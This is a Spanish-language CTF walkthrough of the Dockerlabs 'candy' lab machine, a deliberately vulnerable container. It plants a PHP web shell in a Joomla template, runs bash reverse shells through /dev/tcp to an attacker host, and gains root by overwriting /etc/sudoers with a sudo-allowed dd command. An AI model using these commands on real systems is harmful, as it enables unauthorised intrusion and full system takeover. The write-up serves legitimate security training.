Desplegamos la máquina vulnerable poniendo en la terminal la línea de comandos **bash auto_deploy.sh candy.tar** en la carpeta donde se encuentre el contenido extraído del zip.<br>
<ins>La dirección IP de la máquina a vulnerar siempre es la 172.17.0.2</ins>.

  ![image](https://github.com/user-attachments/assets/469e1cf6-68d3-43b5-bd8c-be025e6b1d24)

Ahora, realizamos un escaneo de puertos de la máquina para revisar los puertos abiertos existentes y los posibles servicios a atacar mediante el uso de esos puertos.

  ![image](https://github.com/user-attachments/assets/a419fc48-e7fd-4bff-8bb9-7392d663f5db)

Podemos ver que se encuentra abierto únicamente el puerto ***80***, correspondiente al servicio ***HTTP***.

Vamos a visualizar la página web. Para ello, escribimos http://172.17.0.2:80 en el navegador.

  ![image](https://github.com/user-attachments/assets/5656e3a3-f334-485b-a4ca-4d9f9feff70c)

Vamos a obtener los subdirectorios existentes en la página web para conseguir visualizar otras páginas que puedan darnos más información. Debido a que revisando el código fuente de la página y mediante el uso del comando ***ffuf*** para realizar fuzzing no detectamos nuevas páginas, vamos a emplear un comando similar llamado ***gobuster***, con el que obtendremos las páginas existentes en distintos formatos. En este caso, vamos a buscar aquellas que tengan extensión .*html*, .*php*, .*js*, .*txt*.

  ![image](https://github.com/user-attachments/assets/c67c5834-46d1-42a0-aa01-9afd7d757d1b)

Nos salen muchos resultados, pero en este caso nos llama la atención el archivo de texto "**robots.txt**". Buscamos la ruta y visualizamos su contenido en la web:

  ![image](https://github.com/user-attachments/assets/9d0e7b7a-6af1-446d-948a-162572ca82fe)

Podemos ver que la página web se ha realizado con el CMS *Joomla*, así que ahora nos dirigimos a la ruta de Administración del servicio (http://172.17.0.2/administrator).

  ![image](https://github.com/user-attachments/assets/5568138b-c3ca-457a-b629-f42f37567a97)

Ingresamos las claves obtenidas:

  ![image](https://github.com/user-attachments/assets/e001d566-bc26-412a-83a8-70afd23b80a6)

  ![image](https://github.com/user-attachments/assets/ce5e1e1c-64f0-4680-be0e-1b7610413f56)

Ya que nos ha salido un mensaje de alerta de que las claves ingresadas no son correctas, comprobamos si la contraseña se encuentra cifrada, debido a que es un poco extraña.

  ![image](https://github.com/user-attachments/assets/e6bddafb-fa60-4c73-8c8b-da3cd2b593f7)

La contraseña de Joomla del usuario "admin" es "**sanluis12345**".

  ![image](https://github.com/user-attachments/assets/627a5578-6b27-4d4f-a4dd-9691b28aa129)

Ahora sí, las claves del usuario son correctas.

Intentamos acceder a la máquina víctima mediante un **ataque SSTI** (*Server-Side Template Injection*). Para ello nos dirigimos a **System>Site Templates** y hacemos clic en la plantilla existente.

  ![image](https://github.com/user-attachments/assets/fb99d2e8-65b8-46cb-82fc-bb4827101751)

Ahora pulsamos en el fichero "**error.php**" y modificamos el contenido añadiendo lo siguiente:

  ![image](https://github.com/user-attachments/assets/9e525a16-0853-412a-952d-dc66522fb849)

Luego, lo visualizamos en la web para ver si se muestra a los usuarios.

  ![image](https://github.com/user-attachments/assets/6e10b823-22ae-4f87-a8b5-5b5c6697c8aa)

Efectivamente, el servidor web es vulnerable al ataque STTI y posiblemente sea también vulnerable al **ataque RCE** (*Remote Code Execution*), el cual consiste en ejecutar código malicioso de manera remota, pudiendo ejecutar comandos del sistema o acceder a este mismo mediante una *reverse shell*.

Para esto, ingresamos el código:<br>
**&lt;?php system($_GET["cmd"]); ?&gt;**

  ![image](https://github.com/user-attachments/assets/5e24c3a9-02f1-4ca3-b3f2-c8253d6523a5)

Si queremos ejecutar un comando del sistema tendremos que escribir la dirección URL (http://172.17.0.2/index.php/templates seguido de la cadena de texto "***?cmd=***" y el comando que queramos arrancar. Probamos con el comando *id* para conocer el usuario actual:

  ![image](https://github.com/user-attachments/assets/ace489f6-065e-4fdb-a911-12b0196450ed)

Somos el usuario *www-data*, cuyo ID de usuario es el 33.

Buscamos la página de [RevShells](https://www.revshells.com/) para ejecutar una reverse shell:<br>
**bash -c \ "bash -i >& /dev/tcp/172.17.0.1/443 0>&1\ "'**

Codificamos el texto para que sea funcional usando Burp Suite.

  ![image](https://github.com/user-attachments/assets/23c9b5ca-a31f-4e36-b9ed-7e8b1b4b93cd)

Nos ponemos con NetCat en escucha por el puerto 443:

  ![image](https://github.com/user-attachments/assets/b21fcc0e-d02c-488a-907d-d6ba07883edd)

  ![image](https://github.com/user-attachments/assets/5b7e29e4-9b73-4d42-9249-1033bd3d68d5)

Hemos accedido al sistema como el usuario "www-data". Para evitar que se cierre nuestra sesión remota, ejecutamos otra reverse shell.<br>
**bash -c "bash -i >& /dev/tcp/172.17.0.1/444 0>&1"**

  ![image](https://github.com/user-attachments/assets/a63b5bba-76ed-4de4-b38c-747129d6c5c7)

  ![image](https://github.com/user-attachments/assets/275fc003-86a3-482f-b3a9-a3d5d4fc30a6)

En este momento ya podríamos empezar a intentar realizar una escalada de privilegios, para acceder al sistema como un usuario privilegiado; o inclusive, como el usuario root.

Revisando los archivos del subdirectorio actual, nos percatamos de que existe un archivo PHP denominado "**configuration.php**", por lo que revisamos su contenido:

  ![image](https://github.com/user-attachments/assets/7839427b-7900-416a-919a-87570faca2a2)

Nos encontramos con una posible contraseña de un usuario existente en el sistema (aparte del usuario www-data).

  ![image](https://github.com/user-attachments/assets/f411b404-cd12-4b8f-8ec2-dbcdfe0e1f15)

Miramos en el directorio "home" los usuarios que hay en la máquina víctima:

  ![image](https://github.com/user-attachments/assets/c23e4640-8e79-48d9-9876-d81d5edd8c5f)

Nos encontramos con 2 usuarios, el usuario "luisillo" y el usuario "ubuntu", que viene por defecto en aquellas máquinas con el sistema operativo Linux Ubuntu.

Probamos a acceder como luisillo:

  ![image](https://github.com/user-attachments/assets/a03dc027-878b-486c-9321-e2c6feb75c7b)

Al parecer la clave encontrada en el PHP no es la contraseña de este usuario, por lo que seguimos buscando.

Buscando en el SUID del usuario, podemos ver que hay un archivo de texto, el cual podemos visualizar sin ser su propietario, lo cual puede suponer una amenaza para el sistema.

  ![image](https://github.com/user-attachments/assets/c9997889-e59a-4b45-906c-5f6aa8b0ac7f)

Miramos el contenido del fichero:

  ![image](https://github.com/user-attachments/assets/b9c115b3-efde-4535-b8a9-3675fb3bea05)

La contraseña del usuario "**luisillo**" es "**luisillosuperpassword**".

Probamos otra vez a ejecutar el comando su luisillo para acceder como este:

  ![image](https://github.com/user-attachments/assets/0acd4b9a-a523-41a4-9187-6885d2d751e3)

Ahora somos el usuario "luisillo".

Miramos con el comando **sudo -l** los archivos binarios que puede ejecutar el usuario actual de manera privilegiada.

  ![image](https://github.com/user-attachments/assets/e6bc952f-7ccd-4304-88d4-e4f71d758395)

Vemos que somos capaces de ejecutar el binario /bin/dd como usuario root, sin necesidad de ingresar ninguna contraseña en la CLI.

Buscamos en [GTFOBins](https://gtfobins.github.io/) acerca del binario ***/bin/dd***.

  ![image](https://github.com/user-attachments/assets/8eabc8c6-550d-4671-8843-ece35b80fa03)

**echo "luisillo ALL=(ALL:ALL) ALL" | sudo /bin/dd of=/etc/sudoers**

  ![image](https://github.com/user-attachments/assets/e4c83e14-4b1c-4d35-8d70-56c5e69aab2d)

  ![image](https://github.com/user-attachments/assets/4f9315eb-68c4-4bfb-b604-5a1f5d6523ef)

Finalmente, somos el usuario root, por lo que contamos con todos los privilegios existentes en el sistema.

Una vez finalizamos con la máquina de Dockerlabs presionamos **Ctrl+C** para eliminarla.

  ![image](https://github.com/user-attachments/assets/90794c8c-dc34-4a6e-a558-2bb1c5eba2b4)
